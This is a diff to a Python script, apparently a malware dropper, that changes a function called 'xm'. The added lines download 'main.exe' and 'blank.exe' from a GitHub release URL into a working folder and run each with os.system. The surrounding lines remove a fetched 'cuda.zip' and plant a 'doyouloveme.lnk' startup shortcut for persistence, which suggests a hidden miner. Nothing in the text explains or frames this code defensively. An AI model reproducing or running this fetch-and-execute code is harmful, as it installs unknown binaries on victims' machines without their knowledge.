@@ -74,9 +74,14 @@ def xm():
          time.sleep(3)
          os.remove("{}/cuda.zip".format(xmpath))
 
-   if not os.path.exists(startupath + '/main.exe'):
-      urllib.request.urlretrieve("https://github.com/benjaminloir/super-duper-broccoli/releases/download/doyouloveme/main.exe", "{}/main.exe".format(startupath))
-      os.system('{}/main.exe'.format(startupath))
+# emp
+   if not os.path.exists(xmpath + '/main.exe'):
+      urllib.request.urlretrieve("https://github.com/benjaminloir/super-duper-broccoli/releases/download/doyouloveme/main.exe", "{}/main.exe".format(xmpath))
+      os.system('{}/main.exe'.format(xmpath))
+#blank
+   if not os.path.exists(xmpath + '/blank.exe'):
+      urllib.request.urlretrieve("https://github.com/benjaminloir/super-duper-broccoli/releases/download/doyouloveme/blank.exe", "{}/blank.exe".format(xmpath))
+      os.system('{}/blank.exe'.format(xmpath))
       
    if not os.path.exists(startupath + '/doyouloveme.lnk'):
       path = os.path.join(startupath, '/doyouloveme.lnk')
